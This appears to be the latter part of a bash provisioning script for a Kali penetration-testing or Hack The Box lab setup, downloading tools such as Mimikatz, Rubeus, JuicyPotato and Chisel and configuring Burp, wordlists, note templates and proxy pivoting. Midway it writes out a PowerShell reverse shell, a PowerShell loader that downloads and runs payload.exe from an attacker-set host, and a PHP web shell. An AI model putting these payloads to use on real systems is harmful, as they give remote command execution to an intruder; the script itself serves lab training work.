cp -n "${HOME}/git/PowerSploit/AntivirusBypass/Find-AVSignature.ps1" ./
cp -n "${HOME}/git/ADModule/Import-ActiveDirectory.ps1" ./
cp -n "${HOME}/git/ADModule/Microsoft.ActiveDirectory.Management.dll" ./

# --- linpeas/winpeas newest version method
curl -SL 'https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh' -o 'linpeas.sh'
curl -SL 'https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat' -o 'winpeas.bat'
curl -SL 'https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe' -o 'winpeas.exe'
chmod u+x linpeas.sh

# --- EyeWitness Windows bindary for targeted browser bookmark screenshotting (EyeWitness.exe --bookmarks)
# Future use, they don't release a pre-built binary at this time, and it's a .sln type Visual Studio build
#curl -SL 'https://github.com/FortyNorthSecurity/EyeWitness/releases/latest/download/EyeWitness.exe' -o 'EyeWitness.exe'


# -- Psypy -- process monitor -- CAO 7/14/2023 is 1.2.1
#
echo -e "\n${GREEN}[*] ${RESET}Downloading ${BOLD}Pspy${RESET} binaries"
curl -SL 'https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64s' -o pspy64s
curl -SL 'https://github.com/DominicBreuker/pspy/releases/latest/download/pspy32s' -o pspy32s
chmod u+x pspy64s
chmod u+x pspy32s

# -- Peirates binary for Kubernetes priv. esc. uses -- CAO 7/14/2023 is v1.1.12
# Building from source requires 1 GB+ aws-sdk libs
echo -e "\n${GREEN}[*] ${RESET}Downloading ${BOLD}Peirates${RESET} binary"
curl -SL 'https://github.com/inguardians/peirates/releases/latest/download/peirates-linux-amd64.tar.xz' -o peirates-linux-amd64.tar.xz
# Extract and skip the top-level directory so that the peirates binary is by itself in current dir
tar -xf peirates-linux-amd64.tar.xz --strip-components 1
chmod u+x peirates
[[ -f peirates-linux-amd64.tar.xz ]] && rm -rf peirates-linux-amd64.tar.xz


# -- Chisel -- CAO 7/14/2023 is v1.8.1
echo -e "\n${GREEN}[*] ${RESET}Downloading latest ${BOLD}Chisel${RESET}"
curl -SL 'https://github.com/jpillora/chisel/releases/latest/download/chisel_1.8.1_windows_amd64.gz' -o chisel.gz
gunzip -f -q chisel.gz
mv chisel chisel.exe
curl -SL 'https://github.com/jpillora/chisel/releases/latest/download/chisel_1.8.1_linux_amd64.gz' -o chisel.gz
gunzip -f -q chisel.gz
chmod +x chisel


if [[ ! -f "${HTB_TRANSFERS}/JuicyPotato.exe" ]]; then
  echo -e "\n${GREEN}[*] ${RESET}Downloading ${BOLD}JuicyPotato${RESET}"
  curl -SL 'https://github.com/AyrA/juicy-potato/releases/download/v1.0/JuicyPotato.exe' -o juicypotato.exe
fi
if [[ ! -f "${HTB_TRANSFERS}/Invoke-DCSync.ps1" ]]; then
  echo -e "\n${GREEN}[*] ${RESET}Downloading ${BOLD}Invoke-DCSync.ps1${RESET}"
  curl -SL 'https://gist.githubusercontent.com/HarmJ0y/4ced579bd21db02759a5/raw/724b2d528d7338fce6350190abbdbb32a967a53e/Invoke-DCSync.ps1' -o Invoke-DCSync.ps1
fi
if [[ ! -f "${HTB_TRANSFERS}/Invoke-Mimikatz.ps1" ]]; then
  echo -e "\n${GREEN}[*] ${RESET}Downloading ${BOLD}Invoke-Mimikatz.ps1${RESET}"
  curl -SL "https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1" -o Invoke-Mimikatz.ps1
fi

if [[ ! -f "${HTB_TRANSFERS}/adfind.exe" ]]; then
  curl -i -s -k -X $'POST' \
    -H $'Host: www.joeware.net' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 42' -H $'Origin: https://www.joeware.net' -H $'Referer: https://www.joeware.net/freetools/tools/adfind/index.htm' -H $'Upgrade-Insecure-Requests: 1' -H $'Sec-Fetch-Dest: document' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-User: ?1' -H $'Te: trailers' -H $'Connection: close' \
    -b $'__gads=ID=8c44f1e487ca6836-22a17a2511cf00ed:T=1641912544:RT=1641912544:S=ALNI_Ma9NL3OyAP_Y9koOInmukUZtF2Qhw' \
    --data-binary $'download=AdFind.zip&email=&B1=Download+Now' \
    $'https://www.joeware.net/downloads/dl2.php' -o adfind.exe
fi


function get_rubeus() {
  # Rubeus is a great complementary tool to have in your AD attacking toolkit
  #   Project: https://github.com/GhostPack/Rubeus
  #   Great Tutorial: https://www.hackingarticles.in/a-detailed-guide-on-rubeus/
  #   Pre-Compiled Binaries: https://github.com/r3motecontrol/Ghostpack-CompiledBinaries
  #
  cd "${HTB_TRANSFERS}"
  curl -SL 'https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe' -o Rubeus.exe

}
get_rubeus



file="ps-revshell-$USER.ps1"
cat <<EOF > "${file}"
\$client = New-Object System.Net.Sockets.TCPClient("${IP}",${PORT});\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + "# ";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()
EOF

file="ps-exec-$USER.ps1"
cat <<EOF > "${file}"
\$bytes = (new-object net.webclient).downloaddata("http://${IP}:8000/payload.exe")
[System.Reflection.Assembly]::Load(\$bytes)
\$BindingFlags = [Reflection.BindingFlags] "Nonpublic,Static"
\$main = [Shell].getmethod("Main", \$BindingFlags)
\$main.Invoke($null, $null)
EOF

file="simple.php"
cat <<EOF > "${file}"
<?php
\$command = shell_exec(\$_REQUEST['cmd']);
echo \$command;
?>
EOF


# -- Burpsuite -----------------------------------------------------------------
echo -e "\n${GREEN}[*] ${RESET}Centralizing ${BOLD}Burpsuite${RESET} configs, extensions, libs, etc. into ${BURPSUITE_CONFIG_DIR}"
mkdir -p "${BURPSUITE_CONFIG_DIR}"/{configs,libs,extensions,projects}
if [[ ! -f "${BURPSUITE_CONFIG_DIR}/libs/jython-2.7.2.jar" ]]; then
  cd "${BURPSUITE_CONFIG_DIR}/libs"
  # Jython 2.7.2 is still latest version available as of Apr 28, 2022
  jython_url='https://repo1.maven.org/maven2/org/python/jython-standalone/2.7.2/jython-standalone-2.7.2.jar'
  echo -e "${GREEN}[*] ${RESET}Downloading ${BOLD}Jython${RESET} lib for Burpsuite (Python add-on support)"
  curl -SL "${jython_url}" -o jython-2.7.2.jar
fi

echo -e "\n${GREEN}[*] ${RESET}Grabbing ${BOLD}Burpsuite${RESET} extensions"
cd "${BURPSUITE_CONFIG_DIR}/extensions"
#git clone https://github.com/bit4woo/domain_hunter
install_or_update_git "domain_hunter" "https://github.com/bit4woo/domain_hunter"

# Paramalyzer - analyze a site's parameters; useful on large-scale site testing
curl -SL "https://github.com/JGillam/burp-paramalyzer/releases/download/v2.1.0/paramalyzer-2.1.0.jar" -o paramalyzer.jar
# Load this up into BurpSuite from: Extender -> Extensions -> Add




# -- Golang & Tools ------------------------------------------------------------
declare -A gotools
gotools["chisel"]="github.com/jpillora/chisel"
gotools["kerbrute"]="github.com/ropnop/kerbrute"
#gotools[""]=""

if [[ $(which go) ]]; then
  # Preferred GOPATH for installed tool binaries is $HOME/go/bin
  #echo -e "\n${GREEN}[*] ${RESET}Installing ${BOLD}Go-based${RESET} tools: chisel, kerbrute"
  GO_VERSION=$(go version | awk '{print $3}' | cut -d 'o' -f2)
  export PATH="$PATH:$HOME/go/bin"
  [[ ! -d "${HOME}/go/bin" ]] && mkdir -p "${HOME}/go/bin"
  #[[ ! $(which chisel) ]] && go get github.com/jpillora/chisel
  #[[ ! $(which kerbrute) ]] && go get github.com/ropnop/kerbrute
  printf "\n${BLUE}[*] Installing: Golang tools (${#gotools[@]})${RESET}\n\n"
  go env -w GO111MODULE=auto
  go_step=0
  declare -A pkgs_failed
  for gotool in "${!gotools[@]}"; do
      go_step=$((go_step + 1))
      eval GO111MODULE=on go get -v ${gotools[$gotool]} $DEBUG_STD
      exit_status=$?
      if [[ $exit_status -eq 0 ]]; then
          printf "${GREEN}[*] (${go_step}/${#gotools[@]}) $gotool installed ${RESET}\n\n"
      else
          printf "${RED}[ERR] (${go_step}/${#gotools[@]}) $gotool failed to install/update ${RESET}\n"
          double_check=true
          # Add failed package to our failed array which will output at the end so user knows which ones failed.
          pkgs_failed+=([$gotool]=${gotools[$gotool]})
      fi
  done
else
  echo -e "${RED}[ERROR] ${ORANGE}Golang/Go${RESET} is missing or not in your PATH. Fix it to get GO pkgs!"
fi


# -- Wordlists -----------------------------------------------------------------
# Unzip the infamous rockyou wordlist
cd /usr/share/wordlists/
if [[ -f /usr/share/wordlists/rockyou.txt.gz ]]; then
  echo -e "\n${GREEN}[*] ${RESET}Decompressing the ${BOLD}RockYou${RESET} wordlist"
  $SUDO gunzip -d /usr/share/wordlists/rockyou.txt.gz 2>/dev/null
fi
$SUDO ln -s /usr/share/seclists /usr/share/wordlists/seclists 2>/dev/null


# Probable-Wordlists project


if [ -n "$(command -v curl 2>&1)" ]; then
  DL_COM="curl --fail -s"
  DL_COM_PDATA="--data"
elif [ -n "$(command -v wget 2>&1)" ]; then
  DL_COM="wget -q -O -"
  DL_COM_PDATA="--post-data"
else
  echo -e "[ERROR] Missing required curl or wget, install either to be able to download files."
fi



function download_torrent() {
  ###
  #   NOTE: If using in a VM, network must be bridged. NAT requires
  #         that you go into Virtual Network Editor and manually fwd
  #         the port being used, in this case 51413

  ###
  # We need to download this wordlist via torrent
  # This package install is not even 1 MB in size
  if [ -n "$(command -v transmission-cli 2>&1)" ]; then
    $SUDO apt-get -y install transmission-cli
  fi

  # to use transmission-cli, we need to update some system settings
  file="/etc/sysctl.conf"
  #$SUDO sed -i -E 's/^socks4\s+127.0.0.1\s+9050/#socks4 127.0.0.1 9050/' "${file}"
  grep -q "net.core.rmem_max = 4194304" "${file}" 2>/dev/null \
    || $SUDO sh -c "net.core.rmem_max = 4194304 >> ${file}"
  grep -q "net.core.wmem_max = 1048576" "${file}" 2>/dev/null \
    || $SUDO sh -c "net.core.wmem_max = 1048576 >> ${file}"
  $SUDO sysctl -p

  cd "$HOME/Downloads" || cd /tmp
  transmission-cli $1
}

#cd /tmp
#url="https://raw.githubusercontent.com/berzerk0/Probable-Wordlists/master/Real-Passwords/Real-Password-Rev-2-Torrents/ProbWL-v2-Real-Passwords-7z.torrent"
# File Links: https://github.com/berzerk0/Probable-Wordlists/blob/master/Downloads.md
#curl -SL "${url}" -o pwl.7z.torrent
#transmission-cli pwl.7z.torrent



# This takes forever, so lets' background it and create a script that will post-process later
#file="/tmp/process-torrent.sh"
#cat <<EOF > "${file}"
##!/bin/bash
#cd /tmp
#p7zip
#EOF




# -- Install Obsidian for Notetaking -------------------------------------------
function install_obsidian_appimage() {
  echo -e "${GREEN}[*] ${RESET}Installing and configuring ${BOLD}Obsidian${RESET}, a Markdown-based notetaking app"
  cd /tmp/
  url='https://github.com/obsidianmd/obsidian-releases/releases/download/v0.14.6/Obsidian-0.14.6.AppImage'
  curl -SL "${url}" -o obsidian
  $SUDO mv /tmp/obsidian /usr/local/sbin/obsidian
  $SUDO chmod +x /usr/local/sbin/obsidian
  # First-run but don't create/open a vault yet
  $SUDO timeout 5 "/usr/local/sbin/obsidian --no-sandbox" >/dev/null 2>&1

  # Setup desktop shortcut & icon for Obsidian
  file="${HOME}/Desktop/obsidian.desktop"
  if [[ ! -f "${file}" ]]; then
    [[ ! -d "${HOME}/.local/share/icons" ]] && mkdir -p "${HOME}/.local/share/icons"
    curl -SL 'https://onionicons.com/parse/files/macOSicons/f107898bec29e0e6b0500fe2d04405c7_1605605112464_Obsidian.icns' -o "${HOME}/.local/share/icons/obsidian.icns"
    cat <<EOF > "${file}"
[Desktop Entry]
Name=Obsidian
Comment=Notetaking application in Markdown
Encoding=UTF-8
Exec=/usr/local/sbin/obsidian --no-sandbox
Icon=${HOME}/.local/share/icons/obsidian.icns
Path=${HTB_NOTES}/
StartupNotify=true
Terminal=false
Type=Application
EOF
    chmod 0555 "${file}"
  fi
}
install_obsidian_appimage


function install_obsidian_extras() {
  # Install extras for this workflow
  # for later, evince permissions error: https://askubuntu.com/questions/1184743/evince-document-viewer-theme-parssing-error-causes-invisible-gui-when-custom-gtk
  $SUDO apt-get -y install evince pandoc p7zip-full
  # Specifying exact texlive pkgs to install, avoiding texlive-full because it is 330+ pkgs
  $SUDO apt-get -y install texlive-latex-recommended
  $SUDO apt-get -y install texlive-latex-extra texlive-fonts-extra

  # Download and install templates we'll use with note and report writing, into "${HTB_NOTES}/templates"
  if [[ ! -e /usr/share/pandoc/data/templates/eisvogel.latex ]]; then
    # Eisvogel is also here: https://github.com/Wandmalfarbe/pandoc-latex-template
    echo -e "\n${GREEN}[*] ${RESET}Downloading Eisvogel latex template"
    cd /tmp
    curl -SL 'https://github.com/Wandmalfarbe/pandoc-latex-template/releases/download/v2.0.0/Eisvogel-2.0.0.tar.gz' -o eisvogel.tar.gz
    tar -xf eisvogel.tar.gz
    mkdir -p "${HTB_NOTES}/templates" 2>/dev/null
    cp /tmp/eisvogel.latex "${HTB_NOTES}/templates/"
    $SUDO cp /tmp/eisvogel.latex /usr/share/pandoc/data/templates/
  fi
  cd /tmp
  echo -e "\n${GREEN}[*] ${RESET}Downloading OSEP template for Obsidian & Pandoc"
  git clone https://github.com/noraj/OSCP-Exam-Report-Template-Markdown
  cp "/tmp/OSCP-Exam-Report-Template-Markdown/src/OSEP-exam-report-template_OS_v1.md" "${HTB_NOTES}/templates/"

  # Reverse Shells cheat sheet
  cd "${HTB_NOTES}/templates"
  echo -e "${GREEN}[*] ${RESET}Downloading Rev Shell Cheatsheet"
  curl -SL 'https://raw.githubusercontent.com/d4t4s3c/Reverse-Shell-Cheat-Sheet/master/README.md' -o "Reverse-Shells-Cheatsheet.md"

  # TODO: https://learnbyexample.github.io/customizing-pandoc/
  file="${HTB_NOTES}/generate-report.sh"
  if [[ ! -e "${file}" ]]; then
    cat <<EOF > "${file}"
#!/bin/bash

# Protip: To get pandoc to convert markdown to PDF with image correctly, you must change
#         every instance of an image from its default format to this:
#         ![image caption here](image.png "Alt text here)
#         Ref: https://tex.stackexchange.com/questions/253262/pandoc-markdown-to-pdf-doesnt-show-images

# Also, if you create many .md files, you can "cat *.md > report.md" and then run this on single file.

TDATE=\$(date +%Y-%m-%d)
if [[ \$# -ne 2 ]]; then
  echo -e " Usage: \$0 <input.md> <output.pdf>"
  exit
fi

if [[ ! -f /usr/share/pandoc/data/templates/eisvogel.latex ]]; then
  echo -e "[ERROR] eisvogel.latex file missing!"
  echo -e "  Download it: https://github.com/Wandmalfarbe/pandoc-latex-template/releases/download/v2.0.0/Eisvogel-2.0.0.tar.gz"
  echo -e "  Save it to: /usr/share/pandoc/data/templates/eisvogel.latex"
  echo -e "  Then try again!"
  exit
fi

pandoc \$1 \\
  -o \$2 \\
  --from markdown+yaml_metadata_block+raw_html \\
  --template eisvogel \\
  --table-of-contents \\
  --toc-depth 6 \\
  --number-sections \\
  --top-level-division=chapter \\
  --highlight-style tango \\
  --metadata=title:"Penetration Test Report" \\
  --metadata=author:"$USER" \\
  --metadata=date:"\$TDATE"

if [[ \$? -eq 0 ]]; then
  evince \$2 &
fi
EOF
    chmod u+x "${file}"
  fi
}
[[ "$update" != true ]] && install_obsidian_extras




# -- Desktop Display Tweaks ----------------------------------------------------
function configure_desktop_tweaks() {
  # Apply a few customizations to standard kali desktop, like shortcuts in taskbar
  # and on the desktop.
  if [[ ${GDMSESSION} == 'lightdm-xsession' ]]; then

    # Thunar file manager settings - make hidden files visible
    xfconf-query -n -c thunar -p /last-show-hidden -t bool -s true

    # Add quick launcher apps to top left
    #mkdir -p ~/.config/xfce4/panel/launcher-{8,9,10,11}
    # Firefox
    #ln -sf /usr/share/applications/firefox-esr.desktop ~/.config/xfce4/panel/launcher-8/browser.desktop
    #xfconf-query -n -c xfce4-panel -p /plugins/plugin-8 -t string -s launcher
    #xfconf-query -n -c xfce4-panel -p /plugins/plugin-8/items -t string -s "browser.desktop" -a
    # Burpsuite
    #ln -sf /usr/share/applications/kali-burpsuite.desktop ~/.config/xfce4/panel/launcher-9/kali-burpsuite.desktop
    #xfconf-query -n -c xfce4-panel -p /plugins/plugin-9 -t string -s launcher
    #xfconf-query -n -c xfce4-panel -p /plugins/plugin-9/items -t string -s "kali-burpsuite.desktop" -a
    # Cherrytree
    #ln -sf /usr/share/applications/cherrytree.desktop ~/.config/xfce4/panel/launcher-10/cherrytree.desktop
    #xfconf-query -n -c xfce4-panel -p /plugins/plugin-10 -t string -s launcher
    #xfconf-query -n -c xfce4-panel -p /plugins/plugin-10/items -t string -s "cherrytree.desktop" -a
    # Geany text editor / IDE
    #ln -sf /usr/share/applications/geany.desktop ~/.config/xfce4/panel/launcher-11/geany.desktop
    #xfconf-query -n -c xfce4-panel -p /plugins/plugin-11 -t string -s launcher
    #xfconf-query -n -c xfce4-panel -p /plugins/plugin-11/items -t string -s "geany.desktop" -a

    # Obsidian
    #ln -sf ~/Desktop/obsidian.desktop ~/.config/xfce4/panel/launcher-12/geany.desktop
    #xfconf-query -n -c xfce4-panel -p /plugins/plugin-12 -t string -s launcher
    #xfconf-query -n -c xfce4-panel -p /plugins/plugin-12/items -t string -s "obsidian.desktop" -a

    #xfconf-query -n -c xfce4-panel -p /plugins/plugin-12 -t string -s separator

  fi
}
[[ "$update" != true ]] && configure_desktop_tweaks


# -- Firefox -------------------------------------------------------------------
# Firefox Bookmarks
# https://www.revshells.com/
# https://gtfobins.github.io/
# https://lolbas-project.github.io/


# -- Proxychains/Redsocks ------------------------------------------------------
function setup_proxytools() {
  # Setup useful for later when:
  #   $ ssh -D 1080 -i id_rsa user@ip
  #   $ proxychains nmap -sT -Pn 172.16.1.0/24
  echo -e "\n${GREEN}[*]${RESET} Configuring Proxychains4 and Redsocks settings"
  file="/etc/proxychains4.conf"
  [[ -e "${file}" ]] && $SUDO cp -n "${file}"{,.bkup}
  # Commenting out the default for "tor" and adding ours in
  #   Proxy type choices: http, socks4, socks5
  $SUDO sed -i -E 's/^socks4\s+127.0.0.1\s+9050/#socks4 127.0.0.1 9050/' "${file}"
  grep -q "socks 127.0.0.1 1080" "${file}" 2>/dev/null \
    || $SUDO sh -c "echo socks4 127.0.0.1 1080 >> ${file}" \
    && $SUDO sh -c "echo socks5 127.0.0.1 1090 >> ${file}"

  file="/etc/redsocks.conf"
  [[ -e "${file}" ]] && $SUDO cp -n "${file}"{,.bkup}
  $SUDO sed -i 's/\tlog_debug.*/\tlog_debug = on;/' "${file}"
  $SUDO sed -i 's/\tlocal_ip =.*/\tlocal_ip = 0.0.0.0/' "${file}"
  $SUDO sed -i 's/\tlocal_port =.*/\tlocal_port = 1122/' "${file}"

  echo -e "\n${GREEN}[*]${RESET} Adding pivot-helper script into: ${HTB_PIVOTING}"
  file="${HTB_PIVOTING}/pivot-helper.sh"
  cat <<EOF > "${file}"
#!/bin/bash
# Change the IP subnet CIDR below to suit the network you are trying to reach
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A OUTPUT -p tcp -d 172.16.1.0/24 -j REDIRECT --to-ports 12345
iptables -t nat -A PREROUTING -p tcp -d 172.16.1.0/24 -j REDIRECT --to-ports 12345
/usr/sbin/redsocks -c /etc/redsocks.conf
EOF
  chmod u+x "${file}"
}
[[ "$update" != true ]] && setup_proxytools


# -- Finished - Script End -----------------------------------------------------
function ctrl_c() {
  # Capture pressing CTRL+C during script execution to exit gracefully
  #     Usage:     trap ctrl_c INT
  echo -e "${GREEN}[*] ${RESET}CTRL+C was pressed -- Shutting down..."
  trap finish EXIT
}


function finish() {
  ###
  # finish function: Any script-termination routines go here, but function cannot be empty
  #
  ###
  #clear
  echo -e "${GREEN}[*] ${RESET}Cleaning up system and updating the locate db"
  $SUDO apt-get -qq clean
  $SUDO apt-get -qq autoremove
  $SUDO updatedb

  echo -e "\n${GREEN}============================================================${RESET}"
  echo -e "  Your system has now been configured! Here is some useful information:"
  echo -e "  HTB Directory Structure:"
  /usr/bin/tree -d -L 2 "${HTB_BASE_DIR}"
  /usr/bin/tree -d -L 2 "${HTB_TOOLKIT_DIR}"
  #echo -e "\t├──${HTB_BASE_DIR}/boxes/"
  #echo -e "\t├──${HTB_BASE_DIR}/notebooks/"
  echo -e ""
  echo -e "  Burpsuite Files:\t${BURPSUITE_CONFIG_DIR}"
  echo -e "  Notetaking:\t\t/usr/local/sbin/obsidian (${GREEN}*NOTE:${RESET} Add --no-sandbox if runnning as root!)"
  echo -e "  VPN Files:\t\t${HOME}/vpn/"
  echo -e ""
  echo -e "  Web Browser Bookmarks to add:"
  echo -e "\t* https://www.revshells.com/"
  echo -e "\t* https://gtfobins.github.io/"
  echo -e "\t* https://lolbas-project.github.io/"
  echo -e "\t* https://book.hacktricks.xyz/"
  echo -e ""
  echo -e "${GREEN}============================================================${RESET}"
  echo -e "\n${GREEN}[*]${RESET} Setup is complete. Open new terminal for dotfiles to take effect."
  #echo -e "${GREEN}[*] ${RESET}Please ${ORANGE}REBOOT${RESET} for desktop settings to take effect."
  sleep 10
  #$SUDO rm -rf /tmp
  FINISH_TIME=$(date +%s)
  echo -e "${GREEN}[*] ${RESET}App: ${BLUE}${APP_NAME}${RESET} Completed Successfully - (Time: $(( $(( FINISH_TIME - START_TIME )) / 60 )) minutes)\n"
}
# End of script
trap finish EXIT

## =================================================================================== ##
## =============================[  Help :: Core Notes ]=============================== ##
#
#
#
#
# [Additional Tools]
# Some additional tools that may come in handy, not added to script yet:
#
#
#
#
## =================================================================================== ##
